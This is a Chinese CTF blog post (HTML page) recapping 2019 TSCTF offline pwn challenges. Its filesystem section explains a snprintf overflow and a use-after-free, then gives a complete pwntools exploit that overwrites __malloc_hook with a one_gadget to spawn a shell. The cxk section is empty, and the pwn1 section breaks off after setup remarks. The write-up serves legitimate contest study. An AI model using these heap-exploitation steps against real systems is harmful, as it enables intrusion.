<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">



  
  
    
    
  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">







<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/014.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/014.jpg?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/014.jpg?v=5.1.4">






  <meta name="keywords" content="ctf,pwn,堆,栈">










<meta name="description" content="6月份的2019TSCTF的线下赛应该是我打的第一次awd，第一次么，难免有些紧张，再加上只有我一个人打pwn（毕竟一个队伍就两个人。。。一人web一人pwn。。。最后开心自闭orz），整个比赛有点手忙脚乱，一直想复盘总结一下这两道题，17和ym学长出的题还是很有水平的，以及加上在这之后又打了两场线下，想在最后说一下我自己的一点心得经验。 ( 正好今天又把绿盟科技线下的awd的pwn1复盘了。。。">
<meta property="og:type" content="article">
<meta property="og:title" content="2019_TSCTF_FINAL(填坑)">
<meta property="og:url" content="http://yoursite.com/2019/08/01/2019-TSCTF-FINAL(填坑)/index.html">
<meta property="og:site_name" content="QingHe">
<meta property="og:description" content="6月份的2019TSCTF的线下赛应该是我打的第一次awd，第一次么，难免有些紧张，再加上只有我一个人打pwn（毕竟一个队伍就两个人。。。一人web一人pwn。。。最后开心自闭orz），整个比赛有点手忙脚乱，一直想复盘总结一下这两道题，17和ym学长出的题还是很有水平的，以及加上在这之后又打了两场线下，想在最后说一下我自己的一点心得经验。 ( 正好今天又把绿盟科技线下的awd的pwn1复盘了。。。">
<meta property="og:locale" content="zh-Hans">
<meta property="og:updated_time" content="2019-08-05T14:40:42.665Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2019_TSCTF_FINAL(填坑)">
<meta name="twitter:description" content="6月份的2019TSCTF的线下赛应该是我打的第一次awd，第一次么，难免有些紧张，再加上只有我一个人打pwn（毕竟一个队伍就两个人。。。一人web一人pwn。。。最后开心自闭orz），整个比赛有点手忙脚乱，一直想复盘总结一下这两道题，17和ym学长出的题还是很有水平的，以及加上在这之后又打了两场线下，想在最后说一下我自己的一点心得经验。 ( 正好今天又把绿盟科技线下的awd的pwn1复盘了。。。">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","width":320,"display":"hide","offset":20,"b2t":true,"scrollpercent":true,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/08/01/2019-TSCTF-FINAL(填坑)/">





  <title>2019_TSCTF_FINAL(填坑) | QingHe</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta custom-logo">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">QingHe</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">生活的艰辛，三分来自压力，七分来自攀比，我想做个小人物</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/01/2019-TSCTF-FINAL(填坑)/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="xiaoxiaorenwu's blog">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="https://i.loli.net/2019/01/29/5c5007a7f263b.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="QingHe">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">2019_TSCTF_FINAL(填坑)</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-01T10:30:02+08:00">
                2019-08-01
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/08/01/2019-TSCTF-FINAL(填坑)/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2019/08/01/2019-TSCTF-FINAL(填坑)/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="page-pv"><i class="fa fa-file-o"></i>
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  3.2k
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  13 min
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>6月份的<code>2019TSCTF</code>的线下赛应该是我打的第一次<code>awd</code>，第一次么，难免有些紧张，再加上只有我一个人打<code>pwn</code>（毕竟一个队伍就两个人。。。一人<code>web</code>一人<code>pwn</code>。。。最后开心自闭orz），整个比赛有点手忙脚乱，一直想复盘总结一下这两道题，17和ym学长出的题还是很有水平的，以及加上在这之后又打了两场线下，想在最后说一下我自己的一点心得经验。</p>
<p>( 正好今天又把绿盟科技线下的<code>awd</code>的pwn1复盘了。。。顺带写在这篇文章后面吧。。这题比赛时和学长一起都没做出来。。。不算很难，但还是蛮有意思的一道题 ） </p>
<h1 id="cxk"><a href="#cxk" class="headerlink" title="cxk:"></a>cxk:</h1><p><a href="https://github.com/xiaoxiaorenwu/mypwn/tree/master/2019TSCTF/%E7%BA%BF%E4%B8%8B%E8%B5%9B" target="_blank" rel="noopener">题目</a></p>
<h2 id="程序分析和漏洞挖掘："><a href="#程序分析和漏洞挖掘：" class="headerlink" title="程序分析和漏洞挖掘："></a>程序分析和漏洞挖掘：</h2><h2 id="exp如下："><a href="#exp如下：" class="headerlink" title="exp如下："></a>exp如下：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="filesystem"><a href="#filesystem" class="headerlink" title="filesystem:"></a>filesystem:</h1><p><a href="https://github.com/xiaoxiaorenwu/mypwn/tree/master/2019TSCTF/%E7%BA%BF%E4%B8%8B%E8%B5%9B" target="_blank" rel="noopener">题目</a>，环境：虚拟机Ubuntu16.04</p>
<h2 id="程序分析和漏洞挖掘：-1"><a href="#程序分析和漏洞挖掘：-1" class="headerlink" title="程序分析和漏洞挖掘："></a>程序分析和漏洞挖掘：</h2><p>这题比cxk要好得多，起码代码量不是很大，我在比赛时也已经分析得差不多了，当时主要卡在<code>unsortedbin_attack</code>，<strong>先申请一个0x50的结构体chunk</strong>这个东西老是干扰我的正常思路，在加上比赛时本来心态就慌，导致思路很乱，再复盘一下。</p>
<p>程序功能自己分析吧，不难，都能看懂，懒得写了。。。。</p>
<h3 id="漏洞点有两个："><a href="#漏洞点有两个：" class="headerlink" title="漏洞点有两个："></a>漏洞点有两个：</h3><ol>
<li><p><code>snprintf</code>的返回值漏洞，其返回的是打印出的字符数，如果我们名字长度是<code>0x20</code>的话，更新时我们就可以填一个<code>0x31</code>长度的名字，正好溢出一个字节，改了<code>size</code>，造成进一步<code>content</code>溢出。</p>
<blockquote>
<p>函数原型：<br><strong>int snprintf(char *str, size_t size, const char *format, …);</strong></p>
<p>size 的作用就是限制往str写入不超过size个字节(包括了结尾的’\0’)。</p>
<p>因为sprintf()函数如果成功的话，返回成功写入的字节数(字符数)，我就一直以为snprintf()函数也是如此，也就是snprintf()函数不会返回大于size的整数。</p>
<p>看下面一段手册内容：</p>
<p><em>The functions snprintf() and vsnprintf() do not  write  more than size bytes (including the trailing ’\0’). If the output was truncated due to this limit then the return value is the number of  characters (not including the trailing ’\0’) which would have been written to the final string if enough space had been  available.  Thus,  a  return value  of  size  or more means that the output was truncated.</em></p>
<p>如果输出因为size的限制而被截断，返回值将是“如果有足够空间存储，所<strong>应</strong>能输出的字符数(不包括字符串结尾的’\0’)”，这个值和size相等或者比size大！也就是说，如果可以写入的字符串是”0123456789ABCDEF”共16位，但是size限制了是10，这样 snprintf() 的返回值将会是<strong>16</strong> 而不是10</p>
</blockquote>
</li>
<li><p><code>UAF</code>，这个都看得出来。</p>
</li>
</ol>
<h3 id="遇到的困难和需要思考的地方："><a href="#遇到的困难和需要思考的地方：" class="headerlink" title="遇到的困难和需要思考的地方："></a>遇到的困难和需要思考的地方：</h3><ul>
<li>困难一：因为在<code>my_malloc</code>时对我们分配的chunk的地址进行了检查，导致我们无法正常地分配chunk到<code>main_arena-0x33</code>去。</li>
<li>解决方法：利用溢出进行<code>unsortedbin_attack</code>将<code>far</code>全局变量改为<code>main_arena+88</code>，从而突破原先的限制。</li>
<li>困难二：因为进行了<code>unsortedbin_attack</code>之后，<code>unsortedbin</code>就已经毁坏无法使用，所以我们之后的malloc都必须从<code>fastbin</code>里取，<strong>每次newfile时都要申请0x50chunk的操作</strong>很干扰我们的进一步行动。</li>
<li>解决办法：因为没有限制file的数量，所以我们可以无限申请file，在进行<code>unsortedbin_attack</code>之前，我们先多次newfile，再多次delete，使0x50的<code>fastbin</code>里留存有大量充足的chunk，使之后的newfile申请的0x50的结构体chunk都直接从这里取，再使0x70的<code>fastbin</code>里提前实现好<code>double free</code>，在<code>unsortedbin_attack</code>之后就可以一气呵成<code>getshell</code>。</li>
</ul>
<h2 id="exp如下：-1"><a href="#exp如下：-1" class="headerlink" title="exp如下："></a>exp如下：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">path = <span class="string">'./filesystem'</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">attach = <span class="number">0</span></span><br><span class="line"><span class="comment">#P = ELF(path)</span></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,terminal=[<span class="string">'terminator'</span>,<span class="string">'-x'</span>,<span class="string">'sh'</span>,<span class="string">'-c'</span>])</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">	p = process(path)</span><br><span class="line">	<span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">		libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_dir</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Give me the directory name: \n'</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_fileN</span><span class="params">(dir_name,file_name,file_size,content, is_changed=<span class="string">'n'</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'which directory do you want to put this file in: \n'</span>)</span><br><span class="line">    p.sendline(dir_name)</span><br><span class="line">    p.recvuntil(<span class="string">'Ok, plz input your filename(len&lt;=0x20): \n'</span>)</span><br><span class="line">    p.sendline(file_name)</span><br><span class="line">    p.recvuntil(<span class="string">'file size: \n'</span>)</span><br><span class="line">    p.sendline(str(file_size))</span><br><span class="line">    p.recvuntil(<span class="string">'changed!!\n'</span>)</span><br><span class="line">    p.sendline(is_changed)</span><br><span class="line">    p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_fileY</span><span class="params">(dir_name,file_name,file_size,new_file_name,content, is_changed=<span class="string">'Y'</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'which directory do you want to put this file in: \n'</span>)</span><br><span class="line">    p.sendline(dir_name)</span><br><span class="line">    p.recvuntil(<span class="string">'Ok, plz input your filename(len&lt;=0x20): \n'</span>)</span><br><span class="line">    p.send(file_name)</span><br><span class="line">    p.recvuntil(<span class="string">'file size: \n'</span>)</span><br><span class="line">    p.sendline(str(file_size))</span><br><span class="line">    p.recvuntil(<span class="string">'changed!!\n'</span>)</span><br><span class="line">    p.sendline(is_changed)</span><br><span class="line">    p.recvuntil(<span class="string">'input your new file name: '</span>)</span><br><span class="line">    p.send(new_file_name)</span><br><span class="line">    p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(dir_name,file_name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'input directory: \n'</span>)</span><br><span class="line">    p.sendline(dir_name)</span><br><span class="line">    p.recvuntil(<span class="string">'input filename: \n'</span>)</span><br><span class="line">    p.sendline(file_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(dir_name,file_name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'input directory: \n'</span>)</span><br><span class="line">    p.sendline(dir_name)</span><br><span class="line">    p.recvuntil(<span class="string">'input filename: \n'</span>)</span><br><span class="line">    p.sendline(file_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover</span><span class="params">(dir_name,file_name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice: \n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'6'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'input directory: \n'</span>)</span><br><span class="line">    p.sendline(dir_name)</span><br><span class="line">    p.recvuntil(<span class="string">'input filename: \n'</span>)</span><br><span class="line">    p.sendline(file_name)</span><br><span class="line"></span><br><span class="line">new_dir(<span class="string">'xxrw'</span>)</span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh0'</span>,<span class="number">0x80</span>,<span class="string">'\x00'</span>*<span class="number">0x80</span>)</span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh1'</span>,<span class="number">0x40</span>,<span class="string">'\x00'</span>*<span class="number">0x40</span>)</span><br><span class="line">delete(<span class="string">'xxrw'</span>,<span class="string">'xqh0'</span>)</span><br><span class="line">recover(<span class="string">'xxrw'</span>,<span class="string">'xqh0'</span>)</span><br><span class="line">show(<span class="string">'xxrw'</span>,<span class="string">'xqh0'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'file content: '</span>)</span><br><span class="line">libcbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - (<span class="number">0x7f72e73ebb78</span><span class="number">-0x7f72e7027000</span>)</span><br><span class="line">log.success(<span class="string">'libcbase = '</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh'</span>,<span class="number">0x30</span>,<span class="string">'\x00'</span>*<span class="number">0x30</span>)</span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh2'</span>,<span class="number">0x40</span>,<span class="string">'\x00'</span>*<span class="number">0x40</span>)</span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh3'</span>,<span class="number">0x40</span>,<span class="string">'\x00'</span>*<span class="number">0x40</span>)</span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh4'</span>,<span class="number">0x40</span>,<span class="string">'\x00'</span>*<span class="number">0x40</span>)</span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh5'</span>,<span class="number">0x40</span>,<span class="string">'\x00'</span>*<span class="number">0x40</span>)</span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh6'</span>,<span class="number">0x40</span>,<span class="string">'\x00'</span>*<span class="number">0x40</span>)</span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh7'</span>,<span class="number">0x40</span>,<span class="string">'\x00'</span>*<span class="number">0x40</span>)</span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh8'</span>,<span class="number">0x40</span>,<span class="string">'\x00'</span>*<span class="number">0x40</span>)</span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh9'</span>,<span class="number">0x40</span>,<span class="string">'\x00'</span>*<span class="number">0x40</span>)</span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh10'</span>,<span class="number">0x40</span>,<span class="string">'\x00'</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'xxrw'</span>,<span class="string">'xqh1'</span>)</span><br><span class="line">delete(<span class="string">'xxrw'</span>,<span class="string">'xqh2'</span>)</span><br><span class="line">delete(<span class="string">'xxrw'</span>,<span class="string">'xqh3'</span>)</span><br><span class="line">delete(<span class="string">'xxrw'</span>,<span class="string">'xqh4'</span>)</span><br><span class="line">delete(<span class="string">'xxrw'</span>,<span class="string">'xqh5'</span>)</span><br><span class="line">delete(<span class="string">'xxrw'</span>,<span class="string">'xqh6'</span>)</span><br><span class="line">delete(<span class="string">'xxrw'</span>,<span class="string">'xqh7'</span>)</span><br><span class="line">delete(<span class="string">'xxrw'</span>,<span class="string">'xqh8'</span>)</span><br><span class="line">delete(<span class="string">'xxrw'</span>,<span class="string">'xqh9'</span>)</span><br><span class="line">delete(<span class="string">'xxrw'</span>,<span class="string">'xqh10'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------prepare getshell-------------------</span></span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh_p1'</span>,<span class="number">0x60</span>,<span class="string">'\x00'</span>*<span class="number">0x60</span>)</span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh_p2'</span>,<span class="number">0x60</span>,<span class="string">'\x00'</span>*<span class="number">0x60</span>)</span><br><span class="line">delete(<span class="string">'xxrw'</span>,<span class="string">'xqh_p1'</span>)</span><br><span class="line">delete(<span class="string">'xxrw'</span>,<span class="string">'xqh_p2'</span>)</span><br><span class="line">recover(<span class="string">'xxrw'</span>,<span class="string">'xqh_p1'</span>)</span><br><span class="line">delete(<span class="string">'xxrw'</span>,<span class="string">'xqh_p1'</span>)</span><br><span class="line"><span class="comment">#----------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh11'</span>,<span class="number">0x9f</span>,<span class="string">'\x00'</span>*<span class="number">0x9f</span>)  </span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh12'</span>,<span class="number">0x30</span>,<span class="string">'\x00'</span>*<span class="number">0x30</span>)</span><br><span class="line">delete(<span class="string">'xxrw'</span>,<span class="string">'xqh11'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\x12'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x603068</span><span class="number">-0x10</span>)</span><br><span class="line">new_fileY(<span class="string">'xxrw'</span>,<span class="string">'xq'</span>*<span class="number">0x10</span>,<span class="number">0x10</span>,<span class="string">'xqh'</span>*<span class="number">0x10</span>+<span class="string">'\xff'</span>,payload)</span><br><span class="line"></span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh13'</span>,<span class="number">0x80</span>,<span class="string">'\x00'</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------success-------------------------</span></span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh_p3'</span>,<span class="number">0x60</span>,p64(libcbase+libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh_p4'</span>,<span class="number">0x60</span>,<span class="string">'\x00'</span>*<span class="number">0x60</span>)</span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'xqh_p5'</span>,<span class="number">0x60</span>,<span class="string">'\x00'</span>*<span class="number">0x60</span>)</span><br><span class="line">new_fileN(<span class="string">'xxrw'</span>,<span class="string">'getshell!!'</span>,<span class="number">0x60</span>,<span class="string">'\x00'</span>*<span class="number">0x13</span>+p64(libcbase+one_gadget[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'xxrw'</span>,<span class="string">'getshell!!'</span>)</span><br><span class="line"><span class="keyword">if</span> attach == <span class="number">1</span>:</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1:"></a>pwn1:</h1><p><a href="https://github.com/xiaoxiaorenwu/mypwn/tree/master/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80%E7%BA%BF%E4%B8%8B/easyheap" target="_blank" rel="noopener">题目</a>，环境：docker：Ubuntu19.04</p>
<p>唉，比较操蛋的是比赛时19.04的虚拟机崩了，学长也没有环境，所以只能在16.04上用脚本强行加载2.29的libc，还没有debug信息和符号表，让人做的很操蛋。也让我知道了docker的优越性，这道题复盘时也算是学了docker的做题环境部署（估计现在做pwn的也没几个人不用docker了orz，丢人。。）</p>
